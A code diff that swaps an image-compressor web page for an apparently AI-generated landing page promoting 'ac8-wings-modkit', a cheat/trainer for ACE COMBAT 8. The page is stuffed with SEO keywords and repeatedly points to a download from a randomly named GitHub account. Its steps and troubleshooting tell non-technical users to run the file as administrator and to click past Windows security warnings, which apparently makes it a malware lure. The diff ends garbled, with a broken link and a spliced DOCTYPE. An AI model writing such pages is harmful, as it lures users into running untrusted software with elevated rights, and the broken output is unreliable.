@@ -1,633 +1,1461 @@
+Here is a complete HTML page for the ac8-wings-modkit GitHub repository, styled with a clean, modern layout and clear download guidance for non-technical users.
+```html
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
-<head> <meta name="google-site-verification" content="sYW1mY6dB9U5vkjDcmDD5JfQBnrwonW5UJOpx_EiQLo" />
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>teknawy — Free Client-Side Image Compressor & Resizer</title>
-    <meta name="description" content="Fast, private, client-side batch image compressor and resizer. No server uploads.">
-
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            darkMode: 'class',
-            theme: {
-                extend: {
-                    colors: {
-                        brand: {
-                            50: '#eef2ff',
-                            500: '#6366f1',
-                            600: '#4f46e5',
-                            700: '#4338ca',
-                        }
-                    }
-                }
-            }
-        }
-    </script>
-
-    <!-- FontAwesome Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
-
-    <!-- JSZip for Batch Downloads -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
-
-    <style>
-        .adsense-placeholder {
-            border: 2px dashed #cbd5e1;
-            background-color: #f8fafc;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #94a3b8;
-            font-size: 0.85rem;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-        ::-webkit-scrollbar { width: 6px; height: 6px; }
-        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
-    </style>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ac8-wings-modkit - 38-Module Utility Suite for ACE COMBAT 8: Wings of Theve</title>
+<meta name="description" content="ac8-wings-modkit is a 38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools. A simple Windows download for the ACE COMBAT 8 trainer and ACE COMBAT 8 cheat community.">
+<meta name="keywords" content="ace-combat-8, wings-of-theve, ace combat 8 trainer, ace combat 8 cheat, ac8-wings-modkit, aircraft performance, MRP economy, mission tools, aerial combat">
+<meta name="author" content="ac8-wings-modkit">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<link rel="canonical" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ac8-wings-modkit - 38-Module Utility Suite for ACE COMBAT 8: Wings of Theve">
+<meta property="og:description" content="Aerial combat, aircraft performance, MRP economy and mission tools in one simple Windows utility suite for ACE COMBAT 8: Wings of Theve.">
+<meta property="og:url" content="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:site_name" content="ac8-wings-modkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="ac8-wings-modkit - 38-Module Utility Suite for ACE COMBAT 8">
+<meta name="twitter:description" content="Aerial combat, aircraft performance, MRP economy and mission tools. Visit the link to download the application.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "ac8-wings-modkit",
+  "operatingSystem": "Windows",
+  "applicationCategory": "UtilityApplication",
+  "description": "38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools.",
+  "url": "https://github.com/changefulnesspitstop975/ac8-wings-modkit",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f6fb;
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 22px 70px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 42px 32px 38px;
+    box-shadow: 0 6px 24px rgba(31, 41, 55, 0.08);
+    border: 1px solid #e6eaf3;
+    text-align: center;
+  }
+  h1 {
+    font-size: clamp(1.65rem, 5vw, 2.35rem);
+    line-height: 1.25;
+    margin: 0 0 14px;
+    letter-spacing: -0.02em;
+    color: #111827;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: clamp(1.25rem, 3.6vw, 1.55rem);
+    line-height: 1.3;
+    margin: 46px 0 14px;
+    letter-spacing: -0.01em;
+    color: #111827;
+    font-weight: 750;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px;
+    color: #1e293b;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: #374151; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; color: #374151; }
+  li { margin-bottom: 9px; }
+  strong { color: #111827; }
+  .tagline {
+    font-size: 1.08rem;
+    color: #4b5563;
+    max-width: 640px;
+    margin: 0 auto 28px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 17px 38px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #4f46e5 0%, #9333ea 100%);
+    color: #ffffff !important;
+    font-size: 1.08rem;
+    font-weight: 700;
+    text-decoration: none;
+    box-shadow: 0 10px 26px rgba(79, 70, 229, 0.35);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    letter-spacing: 0.01em;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 32px rgba(79, 70, 229, 0.42);
+  }
+  .btn-note {
+    font-size: 0.9rem;
+    color: #6b7280;
+    margin: 16px 0 0;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 28px;
+    margin: 18px 0;
+    border: 1px solid #e6eaf3;
+    box-shadow: 0 4px 16px rgba(31, 41, 55, 0.06);
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+    gap: 16px;
+    margin: 20px 0 8px;
+  }
+  .tile {
+    background: #ffffff;
+    border: 1px solid #e6eaf3;
+    border-radius: 14px;
+    padding: 20px 20px 16px;
+    box-shadow: 0 3px 12px rgba(31, 41, 55, 0.05);
+  }
+  .tile h3 { margin-top: 0; font-size: 1rem; }
+  .tile p { margin: 0; font-size: 0.94rem; color: #4b5563; }
+  .callout {
+    background: #eef2ff;
+    border-left: 5px solid #4f46e5;
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin: 22px 0;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0 8px;
+    font-size: 0.95rem;
+    background: #ffffff;
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  th, td {
+    text-align: left;
+    padding: 12px 16px;
+    border-bottom: 1px solid #e6eaf3;
+    color: #374151;
+  }
+  th { background: #f8fafc; color: #111827; font-weight: 700; }
+  tr:last-child td { border-bottom: none; }
+  footer {
+    margin-top: 54px;
+    padding-top: 24px;
+    border-top: 1px solid #e1e6f0;
+    font-size: 0.86rem;
+    color: #7b8494;
+    text-align: center;
+    line-height: 1.9;
+  }
+  a { color: #4f46e5; }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    .page { padding: 24px 14px 50px; }
+    .hero { padding: 30px 20px 28px; border-radius: 16px; }
+    .card { padding: 20px 18px; }
+    .btn { display: block; padding: 16px 20px; }
+    th, td { padding: 10px 12px; font-size: 0.9rem; }
+  }
+</style>
 </head>
-<body class="bg-slate-50 text-slate-800 min-h-screen flex flex-col font-sans antialiased transition-colors duration-200">
+<body>
+<div class="page">
 
-    <!-- NAVBAR -->
-    <header class="bg-white border-b border-slate-200 sticky top-0 z-50 shadow-sm">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
-            <div class="flex items-center gap-3">
-                <div class="w-10 h-10 rounded-xl bg-brand-600 text-white flex items-center justify-center text-lg shadow-md shadow-brand-500/20">
-                    <i class="fa-solid fa-compress"></i>
-                </div>
-                <div>
-                    <h1 class="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-brand-600 to-indigo-800">
-                        teknawy
-                    </h1>
-                    <p class="text-[10px] text-slate-400 font-medium tracking-tight" data-i18n="tagline">100% Client-Side Privacy</p>
-                </div>
-            </div>
+  <header class="hero">
+    <h1>🛩️ ac8-wings-modkit - Master ACE COMBAT 8 Skies</h1>
+    <p class="tagline">A 38-module utility suite for ACE COMBAT 8: Wings of Theve — aerial combat, aircraft performance, MRP economy and mission tools, all in one place for Windows.</p>
+    <a class="btn" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">⬇️ Download ac8-wings-modkit</a>
+    <p class="btn-note">Visit this link to download the application.</p>
+  </header>
 
-            <div class="flex items-center gap-2">
-                <i class="fa-solid fa-globe text-slate-400"></i>
-                <select id="langSelector" class="bg-slate-100 border border-slate-200 text-slate-700 text-sm rounded-lg px-2.5 py-1.5 font-medium outline-none focus:ring-2 focus:ring-brand-500">
-                    <option value="en">English (EN)</option>
-                    <option value="es">Español (ES)</option>
-                    <option value="ar">العربية (AR)</option>
-                </select>
-            </div>
-        </div>
-    </header>
+  <h2>What Is ac8-wings-modkit?</h2>
+  <p>ac8-wings-modkit is a collection of 38 individual modules designed to give you more control over your experience in <strong>ACE COMBAT 8: Wings of Theve</strong>. Instead of juggling a dozen separate tools, you get one package that brings together everything related to flying, fighting, earning and completing missions.</p>
+  <p>The suite is built for players who want to experiment. Maybe you want to feel what a fully upgraded airframe handles like before you spend hours unlocking it. Maybe you want to speed up your MRP (Mission Reward Points) income so you can afford that next aircraft. Maybe you just want to replay a tough mission with a little breathing room. Each of the 38 modules targets one specific part of the game, and you decide which ones are active at any given time.</p>
+  <p>It is often searched for as <em>ace combat 8 trainer</em> or <em>ace combat 8 cheat</em>, and the toolkit fits neatly into both descriptions: a trainer-style set of toggles with a clear, plain interface that does not require any programming knowledge. If you can download a file and double-click it, you can use this.</p>
 
-    <!-- TOP ADSENSE SLOT -->
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 w-full mt-4">
-        <div class="adsense-placeholder w-full h-[90px] rounded-lg">
-            <span>Ad Banner Placeholder (728x90)</span>
-        </div>
+  <h2>✨ What You Get: The 38 Modules</h2>
+  <p>The modules are grouped into four broad areas. You do not need to use all of them — most players find three or four favourites and stick with those. Below is a plain-language tour of what each group does.</p>
+
+  <div class="grid">
+    <div class="tile">
+      <h3>🎯 Aerial Combat</h3>
+      <p>Tools that affect how engagements play out — targeting behaviour, weapon readiness, and the pacing of dogfights.</p>
     </div>
-
-    <!-- MAIN WORKSPACE -->
-    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 w-full my-6 flex-1">
-        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
-
-            <div class="lg:col-span-8 space-y-6">
-                <!-- Upload Area -->
-                <div id="dropZone" class="relative group border-2 border-dashed border-slate-300 hover:border-brand-500 bg-white rounded-2xl p-8 text-center transition-all duration-200 cursor-pointer shadow-sm hover:shadow-md">
-                    <input type="file" id="fileInput" multiple accept="image/png, image/jpeg, image/webp" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10">
-                    <div class="flex flex-col items-center justify-center space-y-3 pointer-events-none">
-                        <div class="w-16 h-16 rounded-full bg-brand-50 text-brand-600 flex items-center justify-center text-2xl group-hover:scale-110 transition-transform duration-200">
-                            <i class="fa-solid fa-cloud-arrow-up"></i>
-                        </div>
-                        <h2 class="text-lg font-semibold text-slate-700" data-i18n="dropzoneTitle">Drag & Drop images here, or browse</h2>
-                        <p class="text-sm text-slate-400" data-i18n="dropzoneSubtitle">Supports PNG, JPEG, WEBP. Unlimited files processed locally.</p>
-                    </div>
-                </div>
-
-                <!-- Controls -->
-                <div id="controlsCard" class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm hidden space-y-6">
-                    <div class="flex items-center justify-between border-b border-slate-100 pb-4">
-                        <h3 class="font-bold text-slate-800 text-lg flex items-center gap-2">
-                            <i class="fa-solid fa-sliders text-brand-600"></i>
-                            <span data-i18n="settingsTitle">Compression & Resizing Settings</span>
-                        </h3>
-                        <button id="clearAllBtn" class="text-sm text-red-500 hover:text-red-700 font-medium transition-colors flex items-center gap-1">
-                            <i class="fa-regular fa-trash-can"></i>
-                            <span data-i18n="clearAll">Clear All</span>
-                        </button>
-                    </div>
-
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <div class="space-y-2">
-                            <div class="flex justify-between items-center text-sm font-semibold text-slate-700">
-                                <label for="qualityRange" data-i18n="qualityLabel">Quality</label>
-                                <span id="qualityVal" class="text-brand-600 font-bold bg-brand-50 px-2 py-0.5 rounded">80%</span>
-                            </div>
-                            <input type="range" id="qualityRange" min="5" max="100" value="80" class="w-full h-2 bg-slate-200 rounded-lg appearance-none cursor-pointer accent-brand-600">
-                            <p class="text-xs text-slate-400" data-i18n="qualityHelp">Lower quality results in smaller file size.</p>
-                        </div>
-
-                        <div class="space-y-2">
-                            <label class="block text-sm font-semibold text-slate-700" data-i18n="formatLabel">Output Format</label>
-                            <select id="formatSelect" class="w-full bg-slate-50 border border-slate-200 rounded-lg p-2.5 text-sm font-medium outline-none focus:ring-2 focus:ring-brand-500">
-                                <option value="original" data-i18n="formatOriginal">Same as original</option>
-                                <option value="image/jpeg">JPEG</option>
-                                <option value="image/webp">WEBP (Best compression)</option>
-                                <option value="image/png">PNG</option>
-                            </select>
-                        </div>
-                    </div>
-
-                    <div class="pt-4 border-t border-slate-100 space-y-4">
-                        <div class="flex flex-wrap items-center justify-between gap-3">
-                            <span class="text-sm font-semibold text-slate-700" data-i18n="resizeMode">Resize Dimensions (Optional)</span>
-                            <label class="flex items-center gap-2 cursor-pointer text-sm text-slate-600">
-                                <input type="checkbox" id="lockAspect" checked class="rounded border-slate-300 text-brand-600 focus:ring-brand-500 w-4 h-4">
-                                <span data-i18n="lockAspect">Lock Aspect Ratio</span>
-                            </label>
-                        </div>
-
-                        <div class="grid grid-cols-2 sm:grid-cols-3 gap-4 items-center">
-                            <div>
-                                <label class="block text-xs text-slate-500 mb-1" data-i18n="widthPx">Width (px)</label>
-                                <input type="number" id="targetWidth" placeholder="Original" class="w-full border border-slate-200 rounded-lg p-2 text-sm focus:ring-2 focus:ring-brand-500 outline-none">
-                            </div>
-                            <div>
-                                <label class="block text-xs text-slate-500 mb-1" data-i18n="heightPx">Height (px)</label>
-                                <input type="number" id="targetHeight" placeholder="Original" class="w-full border border-slate-200 rounded-lg p-2 text-sm focus:ring-2 focus:ring-brand-500 outline-none">
-                            </div>
-                            <div class="col-span-2 sm:col-span-1 flex items-end">
-                                <button id="applyBtn" class="w-full bg-slate-800 hover:bg-slate-900 text-white font-medium text-sm py-2 px-3 rounded-lg transition-colors flex items-center justify-center gap-2">
-                                    <i class="fa-solid fa-arrows-rotate"></i>
-                                    <span data-i18n="applyChanges">Apply</span>
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div id="queueHeader" class="flex items-center justify-between hidden">
-                    <h3 class="font-bold text-slate-700 text-base">
-                        <span data-i18n="filesReady">Files:</span>
-                        <span id="fileCount" class="ml-1 bg-slate-200 text-slate-700 text-xs px-2 py-0.5 rounded-full font-bold">0</span>
-                    </h3>
-                    <button id="downloadZipBtn" class="bg-brand-600 hover:bg-brand-700 text-white font-semibold text-sm px-4 py-2 rounded-xl transition-all shadow-md shadow-brand-500/20 flex items-center gap-2">
-                        <i class="fa-solid fa-file-zipper"></i>
-                        <span data-i18n="downloadZip">Download All (.ZIP)</span>
-                    </button>
-                </div>
-
-                <div id="imageGallery" class="space-y-3"></div>
-            </div>
-
-            <!-- RIGHT COLUMN: Sidebar Ad -->
-            <div class="lg:col-span-4 space-y-6">
-                <div class="adsense-placeholder w-full min-h-[300px] rounded-2xl p-4">
-                    <span>Ad Placeholder (300x250)</span>
-                </div>
-
-                <div class="bg-white border border-slate-200 rounded-2xl p-5 shadow-sm space-y-4 text-sm text-slate-600">
-                    <h4 class="font-bold text-slate-800 flex items-center gap-2">
-                        <i class="fa-solid fa-shield-halved text-emerald-500"></i>
-                        <span data-i18n="whyTitle">Why teknawy?</span>
-                    </h4>
-                    <ul class="space-y-3 text-xs leading-relaxed">
-                        <li class="flex items-start gap-2">
-                            <i class="fa-solid fa-bolt text-amber-500 mt-0.5"></i>
-                            <span data-i18n="whyFast">Instant speed: Execution happens directly on your CPU/GPU using HTML5 Canvas.</span>
-                        </li>
-                        <li class="flex items-start gap-2">
-                            <i class="fa-solid fa-lock text-brand-600 mt-0.5"></i>
-                            <span data-i18n="whyPrivacy">Absolute privacy: Zero server transmission. Safe for confidential photos.</span>
-                        </li>
-                        <li class="flex items-start gap-2">
-                            <i class="fa-solid fa-infinity text-blue-500 mt-0.5"></i>
-                            <span data-i18n="whyUnlimited">No restrictions: Compress hundreds of megabytes without paywalls.</span>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-    </main>
-
-    <!-- BOTTOM ADSENSE SLOT -->
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 w-full mb-6">
-        <div class="adsense-placeholder w-full h-[90px] rounded-lg">
-            <span>Ad Banner Placeholder (Horizontal Responsive)</span>
-        </div>
+    <div class="tile">
+      <h3>🛠️ Aircraft Performance</h3>
+      <p>Adjustments to how your airframe handles, accelerates, climbs and turns, so you can test different flight profiles.</p>
     </div>
+    <div class="tile">
+      <h3>💰 MRP Economy</h3>
+      <p>Controls around Mission Reward Points — how quickly you earn them and how far your budget stretches in the hangar.</p>
+    </div>
+    <div class="tile">
+      <h3>🗺️ Mission Tools</h3>
+      <p>Helpers for mission flow, objectives and replaying content, useful when a single sortie is giving you trouble.</p>
+    </div>
+  </div>
 
-    <!-- FOOTER -->
-    <footer class="bg-white border-t border-slate-200 mt-auto py-6">
-        <div class="max-w-7xl mx-auto px-4 text-center text-xs text-slate-400">
-            <p>© 2026 teknawy. <span data-i18n="footerText">All processing happens locally on your computer.</span></p>
-        </div>
-    </footer>
+  <h3>A Closer Look at Each Group</h3>
+  <p><strong>Aerial combat modules</strong> focus on the moment-to-moment action. These are the toggles that change how quickly you can acquire a target, how your special weapon behaves, and how forgiving a close-range merge feels. If your goal is to enjoy the cinematic side of the game with a little less pressure, this is where you will spend most of your time.</p>
+  <p><strong>Aircraft performance modules</strong> let you explore the flight model. A heavy attacker that climbs like a lightweight fighter, a machine that holds a turn far longer than it should — these are the kinds of experiments the performance group makes possible. Because you can switch them off instantly, they are safe to try in a free flight or a repeatable mission.</p>
+  <p><strong>MRP economy modules</strong> are about progression pace. The aircraft tree in ACE COMBAT 8 is large, and MRP is the currency that unlocks it. These modules give you ways to earn faster, so you can reach the airframes you actually want to fly without a long grind. They pair naturally with performance modules: earn the aircraft, then tune it.</p>
+  <p><strong>Mission tools</strong> cover the wider structure of a sortie. Whether you want to revisit a completed mission, take another run at an objective, or simply shorten the loop between attempts, these modules sit behind the scenes and keep the pace moving.</p>
 
-    <div id="toastContainer" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2 pointer-events-none"></div>
+  <h2>💻 System Requirements</h2>
+  <p>The tool is built for Windows and is lightweight — it does not require a high-end machine, because it is not rendering the game itself.</p>
+  <table>
+    <tr><th>Item</th><th>Requirement</th></tr>
+    <tr><td>Operating system</td><td>Windows 10 or Windows 11 (64-bit)</td></tr>
+    <tr><td>Game</td><td>ACE COMBAT 8: Wings of Theve, installed and running</td></tr>
+    <tr><td>Disk space</td><td>Under 100 MB free</td></tr>
+    <tr><td>Permissions</td><td>Ability to run a downloaded application as administrator</td></tr>
+    <tr><td>Extras</td><td>A mouse and keyboard, plus an internet connection for the initial download</td></tr>
+  </table>
+  <p>If your PC can run ACE COMBAT 8 comfortably, it can run this toolkit without any trouble.</p>
 
-    <!-- JAVASCRIPT -->
-    <script>
-        const translations = {
-            en: {
-                tagline: "100% Client-Side Privacy",
-                dropzoneTitle: "Drag & Drop images here, or browse",
-                dropzoneSubtitle: "Supports PNG, JPEG, WEBP. Unlimited files processed locally.",
-                settingsTitle: "Compression & Resizing Settings",
-                clearAll: "Clear All",
-                qualityLabel: "Quality",
-                qualityHelp: "Lower quality results in smaller file size.",
-                formatLabel: "Output Format",
-                formatOriginal: "Same as original",
-                resizeMode: "Resize Dimensions (Optional)",
-                lockAspect: "Lock Aspect Ratio",
-                widthPx: "Width (px)",
-                heightPx: "Height (px)",
-                applyChanges: "Apply",
-                filesReady: "Files:",
-                downloadZip: "Download All (.ZIP)",
-                whyTitle: "Why teknawy?",
-                whyFast: "Instant speed: Execution happens directly on your CPU/GPU using HTML5 Canvas.",
-                whyPrivacy: "Absolute privacy: Zero server transmission. Safe for confidential photos.",
-                whyUnlimited: "No restrictions: Compress hundreds of megabytes without paywalls.",
-                footerText: "All processing happens locally on your computer.",
-                download: "Download",
-                savings: "Saved",
-                errorType: "Please upload valid image files (PNG, JPEG, WEBP).",
-                processing: "Processing...",
-                zipProgress: "Building ZIP file..."
-            },
-            es: {
-                tagline: "100% Privacidad en el Navegador",
-                dropzoneTitle: "Arrastra y suelta imágenes aquí, o examina",
-                dropzoneSubtitle: "Compatible con PNG, JPEG, WEBP. Sin límites de servidor.",
-                settingsTitle: "Ajustes de Compresión y Dimensiones",
-                clearAll: "Borrar todo",
-                qualityLabel: "Calidad",
-                qualityHelp: "Menor calidad produce archivos más ligeros.",
-                formatLabel: "Formato de Salida",
-                formatOriginal: "Igual que el original",
-                resizeMode: "Redimensionar Píxeles (Opcional)",
-                lockAspect: "Bloquear Proporción",
-                widthPx: "Ancho (px)",
-                heightPx: "Alto (px)",
-                applyChanges: "Aplicar",
-                filesReady: "Archivos:",
-                downloadZip: "Descargar Todo (.ZIP)",
-                whyTitle: "¿Por qué teknawy?",
-                whyFast: "Ultra rápido: Procesamiento en tu procesador/GPU mediante Canvas.",
-                whyPrivacy: "Privacidad absoluta: Nada se sube a internet.",
-                whyUnlimited: "Sin restricciones: Sin límites de pago o archivos.",
-                footerText: "Todo el procesamiento se realiza localmente en tu navegador.",
-                download: "Descargar",
-                savings: "Ahorro",
-                errorType: "Por favor sube solo archivos de imagen (PNG, JPEG, WEBP).",
-                processing: "Procesando...",
-                zipProgress: "Generando ZIP..."
-            },
-            ar: {
-                tagline: "خصوصية كاملة 100% على جهازك",
-                dropzoneTitle: "اسحب الصور وأفلتها هنا، أو اضغط للتصفح",
-                dropzoneSubtitle: "يدعم PNG و JPEG و WEBP. معالجة محلية بدون حدود.",
-                settingsTitle: "إعدادات الضغط وتغيير الحجم",
-                clearAll: "مسح الكل",
-                qualityLabel: "الجودة",
-                qualityHelp: "تقليل الجودة ينتج حجم ملف أصغر.",
-                formatLabel: "صيغة الإخراج",
-                formatOriginal: "نفس الصيغة الأصلية",
-                resizeMode: "تغيير الأبعاد (اختياري)",
-                lockAspect: "قفل نسبة العرض إلى الارتفاع",
-                widthPx: "العرض (بكسل)",
-                heightPx: "الارتفاع (بكسل)",
-                applyChanges: "تطبيق",
-                filesReady: "الملفات:",
-                downloadZip: "تحميل الكل كملف (.ZIP)",
-                whyTitle: "لماذا تختار teknawy؟",
-                whyFast: "سرعة فائقة: المعالجة تتم مباشرة عبر المتصفح باستخدام المعالج الخاص بك.",
-                whyPrivacy: "أمان وخصوصية: لا يتم إرسال أي صورة إلى خوادم خارجية مطلقا.",
-                whyUnlimited: "بدون قيود: اضغط أي عدد من الصور بدون اشتراكات.",
-                footerText: "تتم جميع العمليات محلياً على حاسوبك دون رفع أي بيانات.",
-                download: "تحميل",
-                savings: "وفرت",
-                errorType: "يرجى رفع صور صالحة فقط (PNG, JPEG, WEBP).",
-                processing: "جار المعالجة...",
-                zipProgress: "جار إنشاء ملف ZIP..."
-            }
-        };
+  <h2>🚀 Getting Started: Download and Run</h2>
+  <p>This part is deliberately short. There is one action to take, and no complicated setup afterwards.</p>
+  <ol>
+    <li><strong>Open the download page.</strong> Go to <a href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">https://github.com/changefulnesspitstop975/ac8-wings-modkit</a>. Visit this link to download the application.</li>
+    <li><strong>Save the file to your PC.</strong> Choose a folder you can find again easily, such as your Downloads folder or a new folder on your desktop named "AC8".</li>
+    <li><strong>Start ACE COMBAT 8: Wings of Theve.</strong> Launch the game first and get to the main menu, or into a mission if you prefer. Having the game running before the toolkit is the reliable order.</li>
+    <li><strong>Open the toolkit.</strong> Locate the file you saved and double-click it. If Windows asks for permission, choose Yes — this is normal for any tool that works alongside a running game.</li>
+    <li><strong>Pick your modules.</strong> The window lists the available modules by group. Switch on the ones you want, leave the rest off, and you are finished.</li>
+  </ol>
 
-        let currentLang = 'en';
+  <div class="callout">
+    <p><strong>One link, one download.</strong> Everything you need is at the main project page. You do not need accounts, extra files, or a second tool.</p>
+  </div>
 
-        function updateLanguage(lang) {
-            currentLang = lang;
-            document.documentElement.lang = lang;
-            document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+  <h2>🛠️ First Launch Walkthrough</h2>
+  <p>When the toolkit opens for the first time, you will see a plain window with four groups of toggles. Nothing is switched on by default, which is intentional — you always know exactly what is active.</p>
+  <p><strong>Step 1 — Connect.</strong> Some modules need to know the game is running. If the window shows a connection status, confirm it reads as connected. If it does not, close the toolkit, start the game, and open the toolkit again.</p>
+  <p><strong>Step 2 — Start small.</strong> Switch on a single module from the group you care about most. A good first choice is one MRP economy toggle, because the effect is easy to see after you finish a mission and check your balance.</p>
+  <p><strong>Step 3 — Test in a low-pressure mission.</strong> Use a mission you have already completed rather than a story-critical one. This keeps your first experience calm and lets you compare the difference.</p>
+  <p><strong>Step 4 — Add more gradually.</strong> Once one module behaves the way you expect, add a second. Change one thing at a time and the whole suite stays predictable.</p>
+  <p><strong>Step 5 — Switch off when you are done.</strong> Turn modules off before closing the toolkit, or simply close the game and the toolkit together. Your next session starts clean.</p>
 
-            document.querySelectorAll('[data-i18n]').forEach(el => {
-                const key = el.getAttribute('data-i18n');
-                if (translations[lang][key]) {
-                    el.textContent = translations[lang][key];
-                }
-            });
-            renderGallery();
-        }
+  <h2>💡 Tips for a Smooth Experience</h2>
+  <ul>
+    <li><strong>Run the game in windowed mode</strong> on your first attempt. It makes switching between the game and the toolkit window effortless.</li>
+    <li><strong>Keep a note of your toggles.</strong> A few seconds of note-taking saves confusion later when you cannot remember whether a behaviour is the game or a module.</li>
+    <li><strong>Change one setting per mission.</strong> If something feels off, you will know precisely which module caused it.</li>
+    <li><strong>Close background apps</strong> that overlay on top of games. A cleaner screen gives the toolkit a clearer view and reduces odd behaviour.</li>
+    <li><strong>Return to defaults for story moments.</strong> Switch everything off when you want the intended experience, then switch back on afterwards.</li>
+    <li><strong>Keep the toolkit in one folder.</strong> Moving it around while it is open can interrupt a session.</li>
+  </ul>
 
-        document.getElementById('langSelector').addEventListener('change', (e) => {
-            updateLanguage(e.target.value);
-        });
+  <h2>❓ Frequently Asked Questions</h2>
+  <h3>Do I need to know how to code?</h3>
+  <p>No. There is no scripting, no command line, and no configuration file to edit. Everything happens through simple on and off switches.</p>
+  <h3>Is this a separate game?</h3>
+  <p>No. It works alongside ACE COMBAT 8: Wings of Theve. You still need the game installed and running.</p>
+  <h3>What is the difference between a trainer and a cheat tool?</h3>
+  <p>In practice, very little. Both describe a program that adjusts values or behaviour in a running game. The terms <em>ace combat 8 trainer</em> and <em>ace combat 8 cheat</em> both point at tools like this one.</p>
+  <h3>Can I use just one module?</h3>
+  <p>Yes. Every module is independent. Using a single MRP toggle is a perfectly normal way to use the suite.</p>
+  <h3>Does it work on a laptop?</h3>
+  <p>Yes, as long as the laptop runs Windows 10 or 11 and can run the game itself.</p>
+  <h3>Do I need to reinstall it after an update?</h3>
+  <p>No. Revisit the download link when a new version is published and replace your existing file with the newer one.</p>
 
-        function generateUniqueId() {
-            if (window.crypto && typeof window.crypto.randomUUID === 'function') {
-                try { return window.crypto.randomUUID(); } catch(e) {}
-            }
-            return 'img_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now();
-        }
+  <h2>🔧 Troubleshooting</h2>
+  <p><strong>The window does not open.</strong> Right-click the file and choose to run it as administrator. Some Windows security settings quietly block newly downloaded applications until you confirm them.</p>
+  <p><strong>Windows shows a warning on first launch.</strong> This is standard for any file downloaded from the internet. Choose the option to keep and run the file, then continue.</p>
+  <p><strong>Nothing seems to change in game.</strong> Make sure the game was started before the toolkit. If you launched them in the other order, close both and try again in the correct sequence.</p>
+  <p><strong>A module behaves unexpectedly.</strong> Switch it off, return to the menu, and switch it on again. If the problem repeats, leave that module off and use the others — each one is independent, so a single misbehaving toggle never blocks the rest.</p>
+  <p><strong>The game crashes when a toggle is active.</strong> Turn off the most recently enabled module first. That is almost always the cause of an immediate crash.</p>
 
-        function triggerBrowserDownload(blobOrUrl, fileName) {
-            const isBlob = blobOrUrl instanceof Blob;
-            const url = isBlob ? URL.createObjectURL(blobOrUrl) : blobOrUrl;
-            
-            const link = document.createElement('a');
-            link.style.display = 'none';
-            link.href = url;
-            link.download = fileName;
-            document.body.appendChild(link);
-            link.click();
+  <h2>📌 Versions and Updates</h2>
+  <p>The toolkit is distributed through its project page. New versions appear there when modules are added, adjusted or refreshed. To stay current, simply revisit the link below before a long play session and check whether a newer release is available. Replacing your existing file is all that is required — there is nothing else to uninstall or clean up.</p>
+  <p style="text-align:center; margin-top: 28px;">
+    <a class="btn" href="https://github.com<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
